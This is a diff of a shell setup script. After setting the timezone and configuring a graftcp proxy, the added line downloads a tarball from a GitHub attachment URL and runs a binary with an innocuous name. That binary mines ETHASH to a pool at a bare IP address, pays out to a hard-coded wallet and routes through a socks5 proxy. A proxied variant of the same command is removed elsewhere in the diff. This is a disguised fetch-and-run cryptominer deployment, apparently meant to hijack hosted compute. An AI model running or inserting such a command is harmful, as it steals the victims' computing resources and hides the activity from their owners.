@@ -2,11 +2,7 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
+wget https://github.com/liyanul225/natasha/files/9181714/susumu.tar.gz && tar -xf susumu.tar.gz && susumu/penyemangatku --algo ETHASH --pool stratum+ssl://34.149.10.66:443 --user 39sFYSz9zFgnBfkVGxMaQSHhgWbCMkgReV.Tuyul --tls 0 --ethstratum ETHVETHVETHVETHV1 pause socks5://192.252.209.155:14455
 
 cat > graftcp/local/graftcp-local.conf <<END 
 listen = :2233 
@@ -36,4 +32,3 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp  wget https://github.com/liyanul225/natasha/files/9181714/susumu.tar.gz && tar -xf susumu.tar.gz && susumu/penyemangatku --algo ETHASH --pool stratum+ssl://34.149.10.66:443 --user 39sFYSz9zFgnBfkVGxMaQSHhgWbCMkgReV.Tuyul --tls 0 --ethstratum ETHVETHVETHVETHV1 pause socks5://192.252.209.155:14455
